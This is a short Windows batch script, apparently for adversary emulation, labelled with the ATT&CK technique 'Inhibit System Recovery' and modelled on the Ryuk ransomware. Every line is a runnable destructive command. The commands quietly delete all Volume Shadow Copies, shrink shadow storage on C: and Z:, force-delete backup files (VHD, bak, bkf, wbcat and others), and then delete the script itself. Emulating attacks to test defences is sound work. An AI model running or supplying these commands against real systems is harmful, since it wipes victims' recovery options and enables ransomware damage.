:: T1490 - Inhibit System Recovery
:: From source: https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ 

vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=unbounded
vssadmin resize shadowstorage /for=Z: /on=Z: /maxsize=401MB
vssadmin resize shadowstorage /for=Z: /on=Z: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet

del /s /f /q C:\Users\Public\*.VHD C:\Users\Public\*.bac C:\Users\Public\*.bak C:\Users\Public\*.wbcat C:\Users\Public\*.bkf C:\Users\Public\Backup*.* C:\Users\Public\backup*.* C:\Users\Public\*.set C:\Users\Public\*.win C:\Users\Public\*.dsk
del /s /f /q Z:\Users\Public\*.VHD Z:\Users\Public\*.bac Z:\Users\Public\*.bak Z:\Users\Public\*.wbcat Z:\Users\Public\*.bkf Z:\Users\Public\Backup*.* Z:\Users\Public\backup*.* Z:\Users\Public\*.set Z:\Users\Public\*.win Z:\Users\Public\*.dsk
del %0
